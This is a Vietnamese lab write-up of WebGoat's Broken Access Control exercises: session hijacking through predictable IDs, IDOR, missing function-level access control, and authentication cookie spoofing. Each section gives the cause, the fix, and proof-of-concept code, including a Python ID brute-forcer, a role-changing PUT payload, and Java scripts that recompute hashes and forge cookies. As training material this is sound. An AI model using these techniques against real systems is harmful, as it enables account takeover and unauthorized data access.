# (A1)Broken Access Control

## **Hijack a session**

### Nguyên nhân

```java
// ...
private static final Supplier<String> GENERATE_SESSION_ID =
      () -> ++id + "-" + Instant.now().toEpochMilli();
// ...
if (StringUtils.isEmpty(authentication.getId())) {
    authentication.setId(GENERATE_SESSION_ID.get());
}
// ...
```

- Trang web xác thực người dùng thông qua cookie `hijack_cookie` , tuy nhiên cách khởi tạo cookie này rất dễ đoán và có thể bruteforce để có thể chiếm phiên truy cập của người dùng khác.
- Cụ thể: khi một người dùng đăng nhập vào trang web, một session id sẽ được tạo ra với format: `<id cuản người dùng cuối cùng đăng nhập + 1>-<thời gian lúc đăng nhập>`
- Để chiếm quyền của người dùng khác thì chỉ cần tìm được id của người dùng đó lúc đăng nhập, sau đó bruteforce thời gian để tạo ra được session id của người dùng đó.

### POC

- Đăng nhập lần đầu vào web

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled.png)

- Khi này, server sẽ response kèm với cookie `hijack_cookie=7455010367430442610-1722931194741`
- Gửi request này sang Repeater và gửi lại (đến khi ID tăng quá 1 đơn vị):

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%201.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%202.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%203.png)

- Lúc này Session ID đã tăng lên tận 2 đơn vị: `7455010367430442628 -> 7455010367430442630` . Có nghĩa người dùng khác đã đăng nhập và có ID là `7455010367430442629` , lúc này chỉ cần bruteforce thời gian nữa là sẽ có được cookie của người dùng đó (`1722931359634` tới `1722931360694`)
- Gửi request tới Intruder kèm cookie `hijack_cookie=7455010367430442629-17229313§59634§`  và tiến hành bruteforce giá trị

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%204.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%205.png)

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%206.png)

Và tìm ra được session id của người dùng khác, hoàn thành lab

### Cách khắc phục

Thay cách tạo session id tăng tuần tự thành một cách tạo session id hoàn toàn ngẫu nhiên và khó đoán hơn 

```java
import java.security.SecureRandom;
// ...
private static final SecureRandom secureRandom = new SecureRandom();
private static final Supplier<String> GENERATE_SESSION_ID =
      () -> {
          byte[] randomBytes = new byte[32];
          secureRandom.nextBytes(randomBytes);
          return Base64.getUrlEncoder().encodeToString(randomBytes) + "-" + Instant.now().toEpochMilli();
      };
// ...
```

## **Insecure Direct Object References**

### **Nguyên nhân**

- Lập trình viên lập trình tính năng xem profile nhưng lại để cách xem dựa vào userid và không kiểm tra quyền (sai cách), đây là untrusted data, hacker có thể tận dụng điều này bằng cách thay đổi userid để xem được profile của người dùng khác
- 

```java
String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
      if (userId != null && !userId.equals(authUserId)) {
        // on the right track
        UserProfile requestedProfile = new UserProfile(userId);
        // secure code would ensure there was a horizontal access control check prior to dishing up
        // the requested profile
        if (requestedProfile.getUserId() != null
            && requestedProfile.getUserId().equals("2342388")) {
          return success(this)
              .feedback("idor.view.profile.success")
              .output(requestedProfile.profileToMap().toString())
              .build();
        } else {
          return failed(this).feedback("idor.view.profile.close1").build();
        }
      } else {
        return failed(this).feedback("idor.view.profile.close2").build();
      }
```

```java
String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
    // this is where it starts ... accepting the user submitted ID and assuming it will be the same
    // as the logged in userId and not checking for proper authorization
    // Certain roles can sometimes edit others' profiles, but we shouldn't just assume that and let
    // everyone, right?
    // Except that this is a vulnerable app ... so we will
    UserProfile currentUserProfile = new UserProfile(userId);
    if (userSubmittedProfile.getUserId() != null
        && !userSubmittedProfile.getUserId().equals(authUserId)) {
        // ...
```

### **POC**

Ở phần 2 và 3, khi đăng nhập tài khoản **`tom:cat`** thì khi nhấn vào view profile để xem thông tin thì có một request được gửi đi `/profile` với response trả về như hình 

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%207.png)

Sử dụng url này kèm với userId: `…/profile/{userId}` thì có được một response như sau

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%208.png)

Feedback trả về nói là đã đúng đường dẫn nhưng cần thử một userId khác, lúc này chỉ cần viết một script nhỏ để bruteforce userId hợp lệ (hoặc dùng Intruder của Burp Suite)

```python
import requests

URL = "http://localhost:8080/WebGoat/IDOR/profile/"
headers = {  
    'Cookie': 'JSESSIONID={your session id}'
}  
id = 2342384
while True:
    r = requests.get(URL + str(id), headers=headers)
    json = r.json()
    lessonCompleted = json["lessonCompleted"]
    if lessonCompleted == True:
        print("[+] ID found: " + str(id))
        break
    else:
        id += 1
        print("[-] Trying ID: " + str(id))
```

```powershell
PS C:>Users/Admin/Desktop> python -u "d:\VNPT\projects\WebGoat\Payload\bruteforce-id.py"
[-] Trying ID: 2342385
[-] Trying ID: 2342386
[-] Trying ID: 2342387
[-] Trying ID: 2342388
[+] ID found: 2342388
```

Vậy userId cần hợp lệ là 2342388, truy cập đường dẫn [http://localhost:8080/WebGoat/IDOR/profile/2342388](../WebGoat%203dac4e1692924b5c97aa993738623e50.md)  sẽ pass được phần **View Another Profile** của lab này.

Tiếp theo đổi method thành PUT và Content-Type thành **`Content-Type: application/json`** và body:

```json
{"role":"1", "color":"red", "size":"large", "name":"Buffalo Bill", "userId":"2342388"}
```

Gửi request:

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%209.png)

### **Cách khắc phục**

Kiểm tra xem người dùng thực hiện yêu cầu có quyền hạn không, nếu là quản lý hoặc là người dùng sở hữu hợp lệ thì mới cho phép thực hiện request:

```java
// IDORViewOtherProfile
// ...
String authUserId = (String) userSessionData.getValue("idor-authenticated-user-id");
if (userId != null && userId.equals(authUserId)) {
    UserProfile requestedProfile = new UserProfile(userId);
    
    if (requestedProfile.getUserId() != null && userHasPermission(authUserId, requestedProfile)) {
        return success(this)
            .feedback("idor.view.profile.success")
            .output(requestedProfile.profileToMap().toString())
            .build();
    } else {
        return failed(this).feedback("idor.view.profile.unauthorized").build();
    }
} else {
    return failed(this).feedback("idor.view.profile.invalid").build();
}
// ...
private boolean userHasPermission(String authUserId, UserProfile requestedProfile) {

    return authUserId.equals(requestedProfile.getUserId());
}
// ...
```

```java
// IDOREditOtherProfile
// ...
 UserProfile currentUserProfile = new UserProfile(userId);
    if (userSubmittedProfile.getUserId() != null
        && userSubmittedProfile.getUserId().equals(authUserId) 
        && currentUserProfile.getUserId().equals(authUserId)) {
        // ...
```

## **Missing Function Level Access Control**

### Nguyên nhân lỗi

Lập trình viên để phía front-end các đoạn code, thông tin nhạy cảm, và đồng thời không xác thực quyền truy cập vào các đường dẫn nhạy cảm khiến cho hacker có thể truy cập và xem được các thông tin này.

```html
<li class="hidden-menu-item dropdown">
    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Admin<span class="caret"></span></a>
    <ul class="dropdown-menu" aria-labelledby="admin">
        <li><a href="/access-control/users">Users</a></li>
        <li><a href="/access-control/users-admin-fix">Users</a></li>
        <li><a href="/access-control/config">Config</a></li>
    </ul>
</li>
```

Người dùng có thể tạo tài khoản và đặt quyền admin của mình thoải mái → Người dùng có thể tạo tài khoản admin và sử dụng các tính năng của admin.

```java
@PostMapping(
      path = {"access-control/users", "access-control/users-admin-fix"},
      consumes = "application/json",
      produces = "application/json")
  @ResponseBody
  public User addUser(@RequestBody User newUser) {
    try {
      userRepository.save(newUser);
      return newUser;
    } catch (Exception ex) {
      log.error("Error creating new User", ex);
      return null;
    }

    // @RequestMapping(path = {"user/{username}","/"}, method = RequestMethod.DELETE, consumes =
    // "application/json", produces = "application/json")
    // TODO implement delete method with id param and authorization

  }
```

### POC

Từ đoạn mã html bị ẩn đi, thu thập thêm được 3 đường dẫn là `/access-control/users, /access-control/users-admin-fix, /access-control/config` 

Trong code thì chỉ có 2 đường dẫn /users và /users-admin-fix là hợp lệ, và hai đường dẫn này yêu cầu Content-Type là application/json 

```java
@GetMapping(
      path = {"access-control/users-admin-fix"},
      consumes = "application/json")
      // ...
```

```java
@GetMapping(
      path = {"access-control/users"},
      consumes = "application/json")
      // ...
```

Request đến 2 đường dẫn này (Bổ sung `Content-Type: application/json` vào header)

![Response từ đường dẫn `/users`]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2010.png)

Response từ đường dẫn `/users`

![Response từ đường dẫn `/users-admin-fix` ]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2011.png)

Response từ đường dẫn `/users-admin-fix` 

Response trả về từ đường dẫn `/users` trả về một json danh sách các user gồm 3 data fields: `username, admin, userHash` . → Dựa vào đây có thể tìm được mã hash của tài khoản Jerry là: `SVtOlaa+ER+w2eoIIVE5/77umvhcsh5V8UyDLUa1Itg=`

Còn response trả về từ /users-admin-fix thì trả về status code là 403 forbidden. Nguyên nhân là do trong logic code xử lý request, dev đã kiểm tra currentUser có phải là admin hay không thì mới cho sử dụng tính năng này.

Để lấy được mã hash mới của tài khoản Jerry, chúng ta có 2 cách: 

- Sử dụng đường dẫn /users hoặc /users-admin-fixed bằng phương thức POST để thêm một user mới với quyền admin.
- Phân tích cách tạo ra mã hash của chương trình và tạo lại mã này.

1. **Thêm một user mới với quyền admin**

```java
@PostMapping(
      path = {"access-control/users", "access-control/users-admin-fix"},
      consumes = "application/json",
      produces = "application/json")
  @ResponseBody
  public User addUser(@RequestBody User newUser) {
    try {
      userRepository.save(newUser);
      return newUser;
    } catch (Exception ex) {
      log.error("Error creating new User", ex);
      return null;
    }

    // @RequestMapping(path = {"user/{username}","/"}, method = RequestMethod.DELETE, consumes =
    // "application/json", produces = "application/json")
    // TODO implement delete method with id param and authorization

  }
```

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2012.png)

Vậy là lúc này có thể đăng nhập tài khoản có quyền admin mới này, sau đó request đến `/users-admin-fixed` 

Tuy nhiên cách này ở đây không khả dụng vì không có tính năng đăng nhập để có thể sử dụng.

1. Tạo lại mã Hash
- Đầu tiên cần phải xem cách tạo mã Hash, dev code một hàm `DisplayUser(user, <SALT code>)` để hiển thị thông tin user với password đã bị hash với salt được truyền vào. Ở đây có hai salt được tìm thấy trong mã nguồn là

```java
public static final String PASSWORD_SALT_SIMPLE = "DeliberatelyInsecure1234";
public static final String PASSWORD_SALT_ADMIN = "DeliberatelyInsecure1235";
```

- Đoạn code của hàm `DisplayUser`

```java
@Getter
public class DisplayUser {
  // intended to provide a display version of WebGoatUser for admins to view user attributes

  private String username;
  private boolean admin;
  private String userHash;

  public DisplayUser(User user, String passwordSalt) {
    this.username = user.getUsername();
    this.admin = user.isAdmin();

    try {
      this.userHash = genUserHash(user.getUsername(), user.getPassword(), passwordSalt);
    } catch (Exception ex) {
      this.userHash = "Error generating user hash";
    }
  }

  protected String genUserHash(String username, String password, String passwordSalt)
      throws Exception {
    MessageDigest md = MessageDigest.getInstance("SHA-256");
    // salting is good, but static & too predictable ... short too for a salt
    String salted = password + passwordSalt + username;
    // md.update(salted.getBytes("UTF-8")); // Change this to "UTF-16" if needed
    byte[] hash = md.digest(salted.getBytes(StandardCharsets.UTF_8));
    return Base64.getEncoder().encodeToString(hash);
  }
}
```

- Ban đầu, dev sử dụng salt là `PASSWORD_SALT_SIMPLE` , nhưng đối với /users-admin-fixed thì sử dụng mã salt là `PASSWORD_SALT_ADMIN` . Trong mã nguồn, tìm thấy được password gốc của tài khoản Jerry là `doesnotreallymatter`

![Untitled]((A1)Broken%20Access%20Control%207fb110e753944c7fa58a48dee83dff10/Untitled%2013.png)

- Code lại hàm tạo này và chạy để lấy được mã hash mới của Jerry

```java
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;

class HashJerry {
    public static void main(String[] args) throws Exception {
        String username = "Jerry";
        String password = "doesnotreallymatter";
        String PASSWORD_SALT_ADMIN = "DeliberatelyInsecure1235";

        String hash = genUserHash(username, password, PASSWORD_SALT_ADMIN);
        System.out.println(hash);
    }

    private static String genUserHash(String username, String password, String passwordSalt) throws Exception {
        MessageDigest md = MessageDigest.getInstance("SHA-256");
        String salted = password + passwordSalt + username;
        byte[] hash = md.digest(salted.getBytes(StandardCharsets.UTF_8));
        return Base64.getEncoder().encodeToString(hash);
    }
}
```

- Mã hash mới thu được là: `d4T2ahJN4fWP83s9JdLISio7Auh4mWhFT1Q38S6OewM=`

### Cách khắc phục

- Không để các thông tin nhạy cảm như đường dẫn của admin ở giao diện của người dùng thường.
- Kiểm tra quyền của người dùng hiện tại mới cho phép sử dụng các tính năng đặc biệt.

```java
@PostMapping(
      path = {"access-control/users", "access-control/users-admin-fix"},
      consumes = "application/json",
      produces = "application/json")
  @ResponseBody
  public User addUser(@RequestBody User newUser) {
    try {
	    var currentUser = userRepository.findByUsername(webSession.getUserName());
	    if (currentUser == null || !currentUser.isAdmin()) {
	      return null;
	    }
	    
	    
      userRepository.save(newUser);
      return newUser;
    } catch (Exception ex) {
      log.error("Error creating new User", ex);
      return null;
    }

    // @RequestMapping(path = {"user/{username}","/"}, method = RequestMethod.DELETE, consumes =
    // "application/json", produces = "application/json")
    // TODO implement delete method with id param and authorization

  }
```

## **Spoofing an Authentication Cookie**

### Nguyên nhân lỗi

- Thuật toán mã hóa và giải mã đơn giản, dễ dàng để có thể crack và tìm được thông điệp gốc ban đầu.
- Cụ thể, dev đơn giản tạo ra cookie mã dựa vào `username + SALT (được tạo ngẫu nhiên thành sâu có 10 ký tự)` → sau đó đảo ngược chuỗi này → chuyển thành mã hex → cuối cùng là mã hóa base64.
- Quá trình đảo ngược cũng tương tự.

```java
public static String encode(final String value) {
    if (value == null) {
      return null;
    }

    String encoded = value.toLowerCase() + SALT;
    encoded = revert(encoded);
    encoded = hexEncode(encoded);
    return base64Encode(encoded);
  }

  public static String decode(final String encodedValue) throws IllegalArgumentException {
    if (encodedValue == null) {
      return null;
    }

    String decoded = base64Decode(encodedValue);
    decoded = hexDecode(decoded);
    decoded = revert(decoded);
    return decoded.substring(0, decoded.length() - SALT.length());
  }
```

- Dựa vào điều này, hacker có thể tạo ra một cookie hợp lệ của một người dùng nào đó từ username của họ và truy cập trái phép phiên đăng nhập của người dùng đó.

### POC

- Để truy cập vào tài khoản Tom thì cần tạo ra một cookie của tài khoản này.
- Code lại logic mã hóa của chương trình trên, sau đó truyền username là Tom vào để tạo ra được cookie.

```java
import org.apache.commons.lang3.RandomStringUtils;
import org.springframework.security.crypto.codec.Hex;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

class SpoofCookie{
    private static final String SALT = RandomStringUtils.randomAlphabetic(10);
    
    public static void main(String[] args){
        String username = "tom";
        String cookie = encode(username);
        System.out.println(cookie);
    }

    public static String encode(final String value) {
        if (value == null) {
            return null;
        }

        String encoded = value.toLowerCase() + SALT;
        encoded = revert(encoded);
        encoded = hexEncode(encoded);
        return base64Encode(encoded);
    }

    private static String revert(final String value) {
        return new StringBuilder(value).reverse().toString();
    }

    private static String hexEncode(final String value) {
        char[] encoded = Hex.encode(value.getBytes(StandardCharsets.UTF_8));
        return new String(encoded);
    }

    private static String base64Encode(final String value) {
        return Base64.getEncoder().encodeToString(value.getBytes());
    }
}
```

- Chạy code trên và nhận được cookie `NGY0NDc5NmE1MjZlNTM3MDQ1NzM2ZDZmNzQ=` , gán cookie này sau đó Access thì sẽ có được truy cập bằng tài khoản Tom → pass được assign này.

### Cách khắc phục

- Thay cách mã hóa tự tạo này thành một phương thức mã hóa bảo mật hơn như Json Web Token.